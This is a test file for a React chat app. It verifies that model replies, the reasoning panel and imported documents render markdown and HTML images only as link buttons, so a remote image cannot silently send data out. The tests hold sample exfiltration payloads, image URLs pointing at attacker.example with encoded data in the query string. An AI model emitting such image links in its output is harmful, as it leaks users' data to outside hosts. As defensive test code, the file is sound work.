/**
 * Chat replies and the reasoning panel render model output, and the document
 * reader renders imported text through the same component. A remote image
 * there loads as soon as it renders, so ![x](https://host/?d=...) would send
 * data out with no click. Both renderers never emit an <img> for markdown;
 * an image from another site is shown as a link the learner can open. (The
 * app's own images, figures, drawings and photos, are separate <img>
 * elements that do not render through markdown.)
 *
 * Classic JSX transform under tsx: React must be a global (see
 * render-markdown.test.tsx).
 */
import React from "react";
(globalThis as Record<string, unknown>).React = React;

import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import { DocumentReaderBody } from "../components/document-reader.tsx";
import { MessageResponse } from "../components/ai-elements/message.tsx";
import { Reasoning, ReasoningContent } from "../components/ai-elements/reasoning.tsx";

const renderers = {
	message: (md: string) => renderToStaticMarkup(<MessageResponse mode="static">{md}</MessageResponse>),
	reasoning: (md: string) => renderToStaticMarkup(<Reasoning open><ReasoningContent>{md}</ReasoningContent></Reasoning>),
};

const pixel = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

for (const [name, render] of Object.entries(renderers)) {
	describe(`${name}: remote images`, () => {
		it("a markdown image to another host renders as a link with the alt text, never an <img>", () => {
			const html = render("Here is the chart: ![chart](https://attacker.example/c.png?d=c2VjcmV0)");
			assert.doesNotMatch(html, /<img/);
			assert.doesNotMatch(html, /attacker\.example/);
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>chart<\/button>/);
		});

		it("without alt text the link shows the address", () => {
			const html = render("![](https://attacker.example/c.png)");
			assert.doesNotMatch(html, /<img/);
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>https:\/\/attacker\.example\/c\.png<\/button>/);
		});

		it("raw HTML <img> and plain-http images are blocked the same way", () => {
			for (const md of ['<img src="https://attacker.example/p.png?d=x" alt="p">', "![p](http://attacker.example/p.png)", "![p](//attacker.example/p.png)"]) {
				const html = render(md);
				assert.doesNotMatch(html, /<img/, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
			}
		});

		it("nothing preloads a remote image either", () => {
			assert.doesNotMatch(render("![chart](https://attacker.example/c.png)"), /rel="preload"/);
		});

		it("relative and same-origin paths are not images in markdown either", () => {
			for (const md of ["![p](/image.png)", "![p](./image.png)", "![p](http://localhost/image.png)"]) {
				assert.doesNotMatch(render(md), /<img/, md);
			}
		});

		it("data: images stay as before: no <img>", () => {
			const html = render(`![dot](${pixel})`);
			assert.doesNotMatch(html, /<img/);
			assert.doesNotMatch(html, /iVBORw0KGgo/);
		});

		it("links are unchanged: still Streamdown's link button", () => {
			const html = render("[the paper](https://example.com/paper)");
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>the paper<\/button>/);
		});
	});
}

describe("document reader: remote images", () => {
	it("an imported document cannot load a remote image either; it shows a link", () => {
		const meta = {
			id: "doc_aaaaaaaaaaaa", contentHash: "h", title: "Notes", summary: "", topics: [], filenames: ["n.md"],
			importedAt: "2026-10-01T10:00:00.000Z", updatedAt: "2026-10-01T10:00:00.000Z", origin: "markdown" as const, sections: [], sourceId: "doc_aaaaaaaaaaaa",
		};
		const html = renderToStaticMarkup(<DocumentReaderBody meta={meta} markdown={"# Notes\n![fig](https://attacker.example/f.png?d=x)"} />);
		assert.doesNotMatch(html, /<img/);
		assert.doesNotMatch(html, /attacker\.example/);
		assert.match(html, /data-streamdown="link"[^>]*>fig<\/button>/);
	});
});
